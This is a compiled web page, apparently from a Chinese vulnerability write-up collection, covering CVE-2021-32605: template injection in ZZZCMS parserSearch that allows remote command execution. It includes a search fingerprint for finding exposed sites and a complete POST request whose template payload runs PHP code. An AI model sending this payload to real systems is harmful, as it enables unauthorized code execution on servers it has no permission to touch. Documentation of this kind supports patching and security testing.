import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as r,c as l,a as e,b as n,d as i,e as d}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,"ZZZCMS parserSearch 存在模板注入导致远程命令执行漏洞",-1),h=e("p",null,"参考链接：",-1),u={href:"https://srcincite.io/advisories/src-2021-0015/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://nvd.nist.gov/vuln/detail/CVE-2021-32605",target:"_blank",rel:"noopener noreferrer"},m=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ZZZCMS
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;zzzcms&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下请求包命令执行</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170904549.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /?location=search HTTP/1.1
Host: 
Content-Length: 30
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: text/plain
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=rbuhrqqhoctntnak8slkascqp1; keys=%7Bif%3A%3DPHPINFO%28%29%7D%7Bend+if%7D%0D%0A


keys={if:=PHPINFO()}{end if}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行 ping dnslog</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170904912.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,10);function g(b,_){const a=t("ExternalLinkIcon");return r(),l("div",null,[o,p,h,e("ul",null,[e("li",null,[e("a",u,[n("https://srcincite.io/advisories/src-2021-0015/"),i(a)])]),e("li",null,[e("a",v,[n("https://nvd.nist.gov/vuln/detail/CVE-2021-32605"),i(a)])])]),m])}const k=s(c,[["render",g],["__file","ZZZCMS parserSearch 远程命令执行漏洞.html.vue"]]);export{k as default};
